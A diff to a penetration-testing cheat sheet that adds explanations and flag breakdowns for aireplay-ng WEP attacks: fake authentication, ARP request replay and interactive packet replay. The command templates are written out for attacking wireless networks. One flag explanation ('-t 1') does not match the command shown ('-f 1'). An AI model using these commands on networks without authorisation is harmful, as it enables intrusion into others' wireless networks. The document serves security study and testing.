@@ -106,13 +106,42 @@ This method uses John the Ripper and a wordlist while applying word mangling rul
 ## WEP Attacks
 
 #### Fake Authentication
+
+The fake authentication attack allows you to associate to an access point using either of the two types of WEP authentication: the open system and shared key authentication.  
+
+This attack is useful in scenarios where there are no associated clients and you need to fake an authentication to the AP.
 > `aireplay-ng -1 0 -e <essid> -a <ap> -h <you> <interface>`
 
+* `-1 - Fake Authentication Attack`
+* `0 - The reassociation timing in seconds`
+* `-e <essid> - The wireless network name (ESSID)`
+* `-a <ap> - The AP MAC address`
+* `-h <you> - Your attacking MAC address`
+
+
 #### ARP Request Replay Attack
+
+The ARP request replay attack is the most effective way to generate new initialization vectors and of all the attacks Aireplay has to offer, this attack is probably the most reliable.
+
 > `aireplay-ng -3 -b <ap> -h <you> <interface>`
 
+* `-3 - ARP Request Replay Attack`
+* `-b <ap> - The AP MAC address`
+* `-h <you> - Your attacking MAC address`
+
+For this attack, your wireless card needs to be in monitor mode and you will need either the MAC address of an associated client or your own MAC address after having performed a fake authentication with the AP.
+
 #### Interactive Packet Replay Attack
+
+The Interactive Packet Replay attack allows you to choose a specific packet for replaying/injecting against the target network.
 > `aireplay-ng -2 -b <ap> -d ff:ff:ff:ff:ff:ff -f 1 -m 68 -n 86 <interface>`
+
+* `-2 - Interactive Packet Replay Attack`
+* `-b <ap> - The AP MAC address`
+* `-d ff:ff:ff:ff:ff:ff - Select packets with a broadcast destination address`
+* `-t 1 - Select packets with the "To Distribution System" flag set`
+* `-m <num> - Minimum packet size`
+* `-n <num> - Maximum packet size'
 
 #### KoreK chopchop attack
 > `aireplay-ng -4 -b <ap> -h <you> <interface>`
